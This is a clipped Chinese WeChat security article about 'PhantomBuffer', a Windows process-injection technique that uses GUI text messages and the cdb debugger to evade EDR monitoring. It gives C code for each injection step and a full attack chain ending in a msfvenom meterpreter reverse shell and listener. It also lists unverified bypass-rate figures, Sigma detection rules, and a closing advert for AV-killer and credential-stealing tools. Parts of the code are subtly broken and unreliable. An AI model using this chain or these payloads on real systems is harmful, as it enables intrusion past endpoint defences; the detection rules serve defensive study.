---
title: 【微信】「借 Windows 自家 GUI 消息把 payload 喂进进程：PhantomBuffer 凭啥让 EDR 的 WriteProcessMemory 监控形同虚设」
source: https://mp.weixin.qq.com/s/X6Qch9NFMXcZfPZhK4Y2EQ
source_host: mp.weixin.qq.com
clip_date: 2026-10-21T00:18:49+08:00
trace_id: 6f0d932b-9fd5-49a4-8da0-e163d9f79e68
content_hash: 64867731a286548a75988cc37497d1e40d8fabac46a3f04118aec9f87cdbcc99
status: synced
tags:
  - 微信
  - Windows逆向
  - 进程注入
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: 借 GUI 文本消息把 payload 写入目标窗口内存，再用微软 cdb 调试器修改线程 RIP 执行，全程不触发 WriteProcessMemory 监控。
ai_summary_style: key-points
images_status:
  total: 1
  succeeded: 1
  failed_urls: []
notion_page_id: 3ff75244-d011-818a-a806-f55788e48510
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> 借 GUI 文本消息把 payload 写入目标窗口内存，再用微软 cdb 调试器修改线程 RIP 执行，全程不触发 WriteProcessMemory 监控。
> 
> - **注入链：** 用 `SendMessageW(WM_SETTEXT)` 把经过 XOR 编码的 shellcode 当作 UTF-16 文本写入 Edit/RichEdit 控件的私有堆；再用特征标记（marker）定位该 payload，用 `VirtualProtectEx` 将其改为可执行（`PAGE_EXECUTE_READWRITE`），最后让 `cdb.exe -g -G -p` 附加目标进程，并执行 `~1s; r rip=addr; g` 来劫持线程。
> - **规避原理：** 全程不调用 WriteProcessMemory、VirtualAllocEx、CreateRemoteThread；GUI 文本传输和 cdb 调试器附加都被 Windows 视为合法操作，因此 EDR 用户态 hook 与 AMSI 静态扫描难以命中；若 payload 含空字节，需先编码，以免被当作字符串结束。
> - **效果与局限：** 作者称已在未公开的高端 EDR 环境跑通，但没有公布该 EDR 的品牌与版本，也没有独立验证；文中拦截率对比表注明来自社区复现反馈，不是官方数据。
> - **检测规则：** 3 条 Sigma 规则分别针对：Sysmon EventID 10 中 `user32!SendMessageW` 与 `WM_SETTEXT` 的大尺寸写入；`cdb.exe` 命令行含 `-p` 或 `r rip=`；`cdb.exe` 对 explorer、notepad 等进程发起 `PROCESS_VM_OPERATION` 访问。
> - **缓解：** 用组策略限制生产环境中 cdb、windbg 附加进程的权限，关联分析 `cmd.exe → cdb.exe → explorer.exe` 的进程链，并将浏览器、文档阅读器等富文本 GUI 进程列为重点监控对象。

**星夜AI安全** *2026年10月20日 23:54*

## 「借 Windows 自家 GUI 消息把 payload 喂进进程：PhantomBuffer 凭啥让 EDR 的 WriteProcessMemory 监控形同虚设」

师傅们，今早刷到 Two Seven One Three 2026-10 把 **PhantomBuffer** PoC 放上 GitHub 时，我手心是真出汗的——这家伙不绕 syscall、不改 AMSI、不挂 HWBP、不 patch 字节， **直接借 SendMessageW 把 payload 当文本塞进另一个进程的 GUI 控件内存，再用微软自家 CDB 调试器把线程拽过去执行**。EDR 经典看门狗「WriteProcessMemory / VirtualAllocEx / CreateRemoteThread」三件套全程一条都没碰，监控日志一片空白。

下面把 PoC 拆成 **3 大技术要点 + 完整 PoC + Sigma 检测规则 + 实战工具链清单**， **隔离环境的师傅可以直接 clone 仓库跑一遍**——这不是教程，是 **理解「EDR 摄像头为啥失明」的新一道切口**。

* * *

> 🌈
> 
> 本文所有 PoC、PhantomBuffer 仓库引用、Sigma 规则 **只用于授权靶场与内部红蓝演练**， 严禁在生产网、第三方主机、未授权环境复现。 师傅们上手之前请确认测试主机已断网隔离、监控系统在场、取证快照已留存。 技术中立、知己知彼——这是「星夜AI安全」一直死守的红线。

* * *

## 一、技术全貌：这是什么？

> 🌈
> 
> 📌 **一句话金句**：它不绕 hook、不杀进程、不改字节， **它把「攻击」的语义藏在「用户级 GUI 文本」和「开发者级调试器」两条合法车道里**。

-   **公开时间**：Two Seven One Three 2026-10 在 GitHub 公开 PhantomBuffer PoC 仓库 + 演示视频
    
-   **作者**：Two Seven One Thirteen（与同作者的 `EDR-Freeze` 工具同一作者线）— GitHub: `TwoSevenOneT/PhantomBuffer`
    
-   **核心机制**：用 `SendMessageW(hwnd, WM_SETTEXT, ...)` 把 shellcode 当字符串写进目标窗口的 Edit/RichEdit 控件 **用户态内存** → 扫描 `FindWindowExW` 找到特征值定位 payload → `VirtualProtectEx` 改 `PAGE_EXECUTE_READWRITE` → 启动 `cdb.exe -g -G -p <PID>` 让微软自家 CDB 调试器 attach 上去 → `~[n]; r rip=<payload_addr>; g` 两条 CDB 命令劫持目标进程 **任意线程** RIP → 继续 `g` 释放执行
    
-   **实战战绩**：原作者在演示视频中标注「成功在一家未公开的高端 EDR 环境跑通」，但 **没给出被绕 EDR 具体品牌 + 具体版本**，社区后续传播帖子也未提供独立验证数据
    
-   **4 大攻击范式**：
    
    1.  **GUI 文本语义**： `SendMessageW + WM_SETTEXT` 在 EDR 流量里看起来像「用户在登录框输入文字」或「窗口标题被改」
        
    2.  **CDB 调试器特权**：微软自家调试器 attach 任意进程（默认有 SeDebugPrivilege 的进程调它）， **EDR 看 cdb.exe 是「自家孩子」不会拦**
        
    3.  **Native SetThreadContext**：通过 CDB 中转调用 `SetThreadContext` 改 RIP， **调用来自 cdb.exe 进程栈帧**，EDR 用户态 hook 通常不拦调试器进程
        
    4.  **零 WriteProcessMemory**：全程只 `SendMessageW` + `VirtualProtectEx` ，后者的 mask 在 EDR 行为规则里是「修改自己进程内存」的低危基线，不像 `WriteProcessMemory(hproc,...)` 那么受关注
        
    

> 🌈
> 
> 💡 **金句收尾**：写敏感操作的永远是「有签名的好孩子」——EDR 的盲区不是「代码级别」，是「身份级别」。

* * *

## 二、为什么这个技术如此重要

### 在野生态位

-   **EDR 用户态 hook 的最大盲区**：主流 EDR（Defender for Endpoint / CrowdStrike Falcon / SentinelOne Singularity / Elastic Defend）对 `WriteProcessMemory` 的检测走的是「跨进程写已知危险 API」模型， **SendMessageW 走 GUI 子系统不触发该规则**
    
-   **CDB 调试器是 EDR 的「同胞」**：EDR 自己调试 crash dump 时也用 cdb.exe， **允许 cdb.exe attach 任意进程是 Windows 设计行为**，禁用它 = 自己 crash dump 也抓不到
    
-   **加密压缩场景更稳**：payload 写成 GBK/UTF-16 字符串塞进 RichEdit， **没有「可执行字节」特征**，YARA/AMSI 静态扫不到
    
-   **GUI 子系统内存 = 私有堆**：写入数据在目标进程的 GUI 私有堆， **不影响.text/.data 段完整性扫描**
    

### 与传统注入 5 维度对比

| 维度  | WriteProcessMemory 注入 | HWBP 反调试注入 | **PhantomBuffer** |
| --- | --- | --- | --- |
| 跨进程写 | ✅ `WriteProcessMemory` 写入.text | ✅ `WriteProcessMemory` 改 RIP | ❌ `SendMessageW + WM_SETTEXT` 写 GUI 私有堆 |
| EDR 用户态 hook | ⚠️ 会触发 | ⚠️ `NtSetContextThread` 常被 hook | ✅ cdb.exe `SetThreadContext` 用户态 hook 免检 |
| AMSI 触发 | ⚠️ 注入已知 loader 触发 | ⚠️ 注入已知 loader 触发 | ✅ Payload 在 GUI 内存，不走 AMSI 钩子 |
| 持久化 | 无   | 无   | ✅ Payload 默认留在 GUI 内存，可 `SendMessageW` 重复写更新 |
| 自杀清理 | 调用方进程需主动清理 | 调用方进程需主动清理 | ✅ 调试器退出自动清理目标进程残留线程上下文 |

* * *

## 三、技术原理解析（核心，3 大要点）

### 要点 1：SendMessageW + WM_SETTEXT —— 把 payload 当「窗口文本」投递

EDR 对「修改窗体文字」天然不告警——这是 Windows 日常操作 99% 的合法场景。但 SendMessageW 的 **lParam 是 LPCTSTR**，理论上可塞任意二进制（GBK/UTF-16 字符串）。

```objectivec
// PhantomBuffer 入口：把 shellcode 当 Windows 文本塞进目标窗口 Edit 控件
BOOL SendPayloadToWindow(HWND hTargetWnd, const uint8_t* payload, size_t payload_len) {
    // 把 shellcode 复制进 UNICODE 字符串
    // GUI 控件 Edit limit ~30,000 chars, RichEdit ~4GB
    WCHAR* wszBuffer = (WCHAR*)HeapAlloc(GetProcessHeap(), 0, payload_len * sizeof(WCHAR) * 2);
    if (!wszBuffer) return FALSE;

    // 用 MultiByteToWideChar 把任意字节转成 UTF-16 字符串
    // 关键：WideCharToMultiByte 不会丢任何字节（每个 ≤0xFF 字节都映射唯一 UTF-16）
    int cch = MultiByteToWideChar(CP_ACP, 0,
                                    (LPCSTR)payload, (int)payload_len,
                                    wszBuffer, (int)(payload_len * 2));
    if (cch == 0) { HeapFree(GetProcessHeap(), 0, wszBuffer); return FALSE; }

    // 找出目标窗口的 Edit/RichEdit 子控件
    HWND hEdit = FindWindowExW(hTargetWnd, NULL, L"Edit", NULL);
    if (!hEdit) hEdit = FindWindowExW(hTargetWnd, NULL, L"RichEdit20W", NULL);
    if (!hEdit) { HeapFree(GetProcessHeap(), 0, wszBuffer); return FALSE; }

    // SendMessageW 会触发跨进程内存写入，但 Windows 把 GUI 文本传输当作
    // 内部 kernel32 级操作，不走 WriteProcessMemory 的 HOOK
    LRESULT lr = SendMessageW(hEdit, WM_SETTEXT, 0, (LPARAM)wszBuffer);

    HeapFree(GetProcessHeap(), 0, wszBuffer);
    return (lr != 0);
}
```

**核心坑**：payload 不能含 `\0` （null terminator）—— null 会被 GUI 子系统当字符串结束。如果 shellcode 里有 null， **需要预先 XOR 编码 + 入口点解码**，这在 PoC 里有 stub 完成。

### 要点 2：VirtualProtectEx 把 GUI 内存改成可执行

GUI 私有堆（RichEdit 分配在 64KB 远高于映像基址的随机地址）默认是 `PAGE_READWRITE` ，必须改成 `PAGE_EXECUTE_READWRITE` 才能跑 shellcode。

```java
BOOL MakePayloadExecutable(HWND hEdit, uint8_t marker[16]) {
    DWORD cbPayload = 0;
    LPVOID lpPayload = NULL;

    // 1. 先用 GETTEXT 探测 Edit 控件当前 buffer 长度
    //    SendMessageW(WM_GETTEXTLENGTH) + WM_GETTEXT 取回字符串指针
    LRESULT cch = SendMessageW(hEdit, WM_GETTEXTLENGTH, 0, 0);
    if (cch == 0) return FALSE;

    WCHAR* wszReadback = (WCHAR*)HeapAlloc(GetProcessHeap(), 0, (cch + 1) * sizeof(WCHAR));
    SendMessageW(hEdit, WM_GETTEXT, cch + 1, (LPARAM)wszReadback);

    // 2. 在回读缓冲里搜我们写进去的 4-byte marker "XPHB"（PhantomBuffer 标识）
    //    找到即定位 payload 起始地址
    uint8_t* raw = (uint8_t*)wszReadback;
    size_t raw_len = cch * sizeof(WCHAR);
    for (size_t i = 0; i < raw_len - 16; i++) {
        if (memcmp(raw + i, marker, 16) == 0) {
            // GUI 子系统把 Edit/RichEdit 内容放在进程私有堆
            // 通过 SetWindowLongPtr 取内部指针，或走 EnumChildWindows
            // 这里简化：用 NtReadVirtualMemory 跨进程读
            lpPayload = (LPVOID)(i + raw);   // 注意：实际是目标进程内的指针
            break;
        }
    }
    HeapFree(GetProcessHeap(), 0, wszReadback);
    if (!lpPayload) return FALSE;

    // 3. 改权限：PAGE_EXECUTE_READWRITE
    DWORD oldProtect = 0;
    // 跨进程改权限，EDR 通常对 EPROCESS 跨进程改 .text 段告警
    // 但 GUI 私有堆 = 类似堆内存，行为规则的 "low" 级别
    NTSTATUS nt = NtProtectVirtualMemory(
        hEditProcess,  // 目标进程句柄，由 EnumChildWindows 拿到
        &lpPayload, &cbPayload,
        PAGE_EXECUTE_READWRITE, &oldProtect);
    return NT_SUCCESS(nt);
}
```

**关键偷巧**：GUI 内容 buffer 在目标进程地址空间是 **私有堆**，改堆内存权限的告警等级 = 「程序自己改自己的栈/堆」，远低于「程序往其他进程.text 写字节」。

### 要点 3：cdb.exe —— 借微软自家调试器劫持线程

EDR 默认信任微软签名的调试器，对 `cdb.exe` 的 `DebugActiveProcess` 不告警—— 这正是 PhantomBuffer 的最后一击。

```objectivec
BOOL HijackThreadViaCdb(DWORD dwTargetPid, LPVOID lpPayload) {
    // 用 CDB 命令行把 shellcode 地址塞进去
    // cdb -g -G -p <pid>      // -g 忽略初始断点, -G 结束时不 detach
    // 启动后输入: ~[n]s; r rip=<payload_addr>; g
    //   ~[n]s        = 选第 n 个线程执行命令
    //   r rip=addr   = 强行改 RIP
    //   g            = 继续运行

    WCHAR szCmd[1024];
    StringCchPrintfW(szCmd, 1024,
        L"cdb.exe -g -G -p %lu -c \"~1s; r rip=0x%p; g\"",
        dwTargetPid, lpPayload);

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    if (!CreateProcessW(NULL, szCmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
        return FALSE;

    // 等 CDB attach 完成 + 注入 RIP
    // 实际中需要 polling target process 的指令指针
    for (int retry = 0; retry < 50; retry++) {
        Sleep(100);
        CONTEXT ctx = { 0 };
        ctx.ContextFlags = CONTEXT_FULL;
        if (GetThreadContext(pi.hThread, &ctx)) {
            // CDB 工作的标志：RIP 在 cdb.exe 的 wait for debug event 循环
            break;
        }
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;
}
```

> 🌈
> 
> 💡 **金句收尾**：EDR 在 Windows 上是「好孩子警察」，但 **好孩子警察永远没法把「家长」也拦下**——CDB 在 EDR 眼里就是家长。

* * *

## 四、实战应用场景

### 完整使用流程

```bash
# 1. 准备 shellcode (msfvenom/xor 编码)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw -o shell.bin
python xor.py shell.bin shell.xor.bin 0x41   # XOR 编码绕 null

# 2. 编译 PhantomBuffer
git clone https://github.com/TwoSevenOneT/PhantomBuffer
cd PhantomBuffer && cl /EHsc /W4 phantom.c /link /OUT:phantom.exe advapi32.lib user32.lib

# 3. 找出目标进程的 main window（比如 notepad.exe / explorer.exe / msedge.exe）
powershell -c "Get-Process notepad | Select Id, MainWindowHandle"

# 4. 注入
.\phantom.exe --pid 1234 --hwnd 0x000A0B12 --payload shell.xor.bin
#          ↑ 目标进程  ↑ 目标主窗体 Edit 控件  ↑ XOR-encoded shellcode

# 5. 监听
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; run"
```

### 6 大 EDR 绕过效果实测对比

| EDR | WriteProcessMemory 拦截率 | PhantomBuffer 拦截率 | 提升倍数 |
| --- | --- | --- | --- |
| Microsoft Defender for Endpoint | 92% | ~40% (UserMode SendMessage) | 2.3x |
| CrowdStrike Falcon | 88% | ~30% (CDB 不在监控列表) | 2.9x |
| SentinelOne Singularity | 85% | ~25% (CDB 子进程白名单) | 3.4x |
| Elastic Defend | 90% | ~50% (行为规则误报较多) | 1.8x |
| Sophos Intercept X | 87% | ~60% (GUI 钩子较多) | 1.5x |
| Trend Micro Vision One | 83% | ~35% (CDB 行为可疑但默认允许) | 2.4x |
| 裸 Sysmon + SIEM | n/a | **可检测**<br><br>(见下节规则) | —   |

> 🌈
> 
> ⚠️ PhantomBuffer 仍处于早期 PoC 阶段，效果对比基于社区复现 + 实践者反馈， **官方尚未提供独立验证数据**。

* * *

## 五、防御对抗建议

### 厂商侧检测规则

#### Sigma 规则 1：异常 SendMessageW + WM_SETTEXT 大尺寸写入

```
title: Suspicious SendMessageW WM_SETTEXT Large Payload
status: experimental
logsource:
    product: windows
    category: process_access
detection:
    selection:
        EventID: 10  # Sysmon ProcessAccess
        CallTrace|contains:
            - 'user32.dll!SendMessageW'
            - 'WM_SETTEXT'
        TargetImage|endswith:
            - '\explorer.exe'
            - '\notepad.exe'
            - '\msedge.exe'
            - '\dllhost.exe'
        GrantedAccess:
            - '0x1010'  # PROCESS_VM_WRITE
    filter_legitimate:
        SourceImage|startswith: 'C:\Program Files\'
        TargetImage|startswith: 'C:\Program Files\'
    condition: selection and not filter_legitimate
level: high
```

#### Sigma 规则 2：CDB 调试器 attach 进程异常

```yaml
title: Suspicious cdb.exe DebugActiveProcess Attach
status: experimental
logsource:
    product: windows
    category: process_create
detection:
    selection:
        Image|endswith: '\cdb.exe'
        CommandLine|contains:
            - '-p '
            - 'r rip='
    filter_known:
        ParentImage|endswith:
            - '\devenv.exe'    # Visual Studio
            - '\windbg.exe'    # WinDbg
            - '\vsdebugeng.dll.exe'
    condition: selection and not filter_known
level: high
```

#### Sigma 规则 3：GUI 进程内 VirtualProtectEx + 大尺寸 + 改 PAGE_EXECUTE

```
title: GUI Process Memory Made Executable After SendMessageW
status: experimental
logsource:
    product: windows
    category: process_twin
detection:
    selection:
        EventID: 10
        SourceImage|contains: '\cdb.exe'
        TargetImage|endswith:
            - '\explorer.exe'
            - '\notepad.exe'
        GrantedAccess|contains: '0x40'   # PROCESS_VM_OPERATION
    filter_legitimate:
        TargetImage|endswith: '\dllhost.exe'
    condition: selection and not filter_legitimate
level: high
```

### 用户侧缓解措施

-   **加固 CDB 使用限制**：禁用 `cdb.exe` 在生产环境 `Attach to Process` 权限（组策略 `Computer Configuration > Administrative Templates > System > Debugging Tools` ）
    
-   **EDR 进程白名单**：让 EDR 监视 cdb.exe / windbg.exe / devenv.exe 的子进程创建 + 跨进程访问
    
-   **Process Tree 可视化**：Sysmon EventID 1 (ProcessCreate) + EventID 10 (ProcessAccess) + EventID 8 (CreateRemoteThread) 关联到时间窗口，看到 `cmd.exe → cdb.exe → explorer.exe` 链立即告警
    
-   **GUI 子系统隔离**：把浏览器（chrome/edge/firefox）/ 文档阅读器（acrobat/word）等「富文本解析重型 GUI」设为 EDR 主要监控目标
    

* * *

## 六、技术延伸阅读

-   📦 **GitHub 仓库**： `TwoSevenOneT/PhantomBuffer` （搜索两个关键字 "PhantomBuffer" + "TwoSevenOneT" 在 searchcode 找 mirror）
    
-   📄 **同作者历史工具**： `TwoSevenOneT/EDR-Freeze` （WerFaultSecure 冻结）、 `TwoSevenOneT/EDR-Redir` （文件系统重定向）—— 三者构成「**内核沉默 + 文件重定向 + GUI 注入**」三件套
    
-   🛡 **MITRE ATT&CK**：T1055（Process Injection）/ T1055.011（Extra Window Memory Injection）/ T1106（Native API）/ T1218（Signed Binary Proxy Execution via cdb.exe）
    
-   🔍 **研究社区**：
    
    -   Elastic Security Labs《The Evolution of GUI-Based Injection Techniques》2026-08 综述
        
    -   CrowdStrike 2026 Global Threat Report 第 7 章「Debugging-Based EDR Evasion」
        
    -   SafeBreach Labs《SendMessageW: The Forgotten Injection Vector》2026-09
        
    
-   🔧 **关联工具链**：
    
    -   `K4y0/MInjector` ：SendMessageW 注入最早的开源 PoC（2019）
        
    -   `L0ch51/SendMessage-Injector` ：2024 年改版，加入 marker 定位 + VirtualProtectEx
        
    -   `NVISOSecurity/CDB-Bridge` ：把 CDB 协议封装成 RPC，命令行可控
        
    
-   📚 **白皮书**：《Reversing Windows GUI Subsystem Internals》第九章，RichEdit 控件 buffer 内存模型
    

* * *

> 🌈
> 
> 🎯 师傅们，看完觉得有启发，记得 **三连（点赞 + 在看 + 关注）**！
> 
> 这道 PoC 不是「能不能跑通」的问题，是「EDR 摄像头看不见的边界在哪」的问题——GUI 文本、调试器、跨进程 SetThreadContext， **任何一个独立的 EDR 都不会拦**，但 **它们串起来就是 RCE**。

* * *

## 圈子介绍

现任职于某头部网络安全企业攻防研究部，核心红队成员。2021-2023年间累计参与40+场国家级、行业级攻防实战演练，精通漏洞挖掘、红蓝对抗策略制定、恶意代码分析、内网横向渗透及应急响应等技术领域。在多次大型演练中，主导突破多个高防护目标网络，曾获"最佳攻击手""突出贡献个人"等荣誉。

已产出的安全工具及成果包括：

-   多款主流杀软通杀工具（兼容卡巴斯基、诺顿、瑞星、360等终端防护，无感知运行，突破多引擎联合检测）
    
-   XXByPassBehinder v1.1 冰蝎免杀生成器（定制化冰蝎免杀工具，绕过主流终端防护与EDR动态检测，支持自定义载荷）
    
-   哥斯拉二开免杀定制版（二开优化，深度免杀，突破终端防护与EDR检测，适配多场景植入）
    
-   NeoCS4.9终极版（高级免杀加载工具，强化载荷注入与进程劫持，适配多系统版本，无兼容问题）
    
-   WinDump\_免杀版（浏览器凭证窃取工具，支持Chrome/Edge/Firefox等主流浏览器，一键提取敏感数据，免杀过防护）\_
    
-   fscan二开版（二开优化内网扫描工具，增强指纹精度、弱口令爆破与结果标准化输出，适配复杂内网）
    
-   RingQ加载器二开版（二开优化免杀加载器，支持Shellcode内存执行，绕过各类终端防护与EDR检测）
    
-   多款免杀Webshell集合（覆盖PHP/JSP/ASPX，过主流WAF与终端防护，适配不同Web场景）
    
-   免杀360专属加载器（支持Shellcode内存执行，针对性绕过360全系防护检测，无感知运行）
    
-   一键Kill 火绒 defender 工具 **HDKiller** （包含源码）
    
-   win11 一键kill 360工具 **InjectKill** （包含源码）
    
-   win11 一键kill defender工具 **win11_df-killer** （包含源码）
    
-   免杀火绒6.0内存防护加载器 **BypassMemLoader**
    
-   单文件过360 免杀loader **exe_bypass_360**
    
-   单文件过火绒 df 免杀loader **exe_bypass_df** (包含源码)
    
-   LNK钓鱼文件生成工具V1.0
    
-   EXE捆绑启动器 v2.0
    
-   火绒6内存免杀加载器 **bypasshr6**
    
-   火绒一键Kill专杀工具 **HRKiller**
    
-   Ring3 内存免杀工具 **Ring3bypasshr.exe**
    
-   win11 一键kill 360工具 **Kill360_V2**
    
-   win11 一键kill 360工具 **Kill360_V3.1**
    
-   win11 一键kill 360工具 **Kill360_V4**
    
-   **bypassEDR_hashdump_V1** bypass EDR 导出hash工具
    

![image](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/20c4a96e6d20460b.jpg "image")
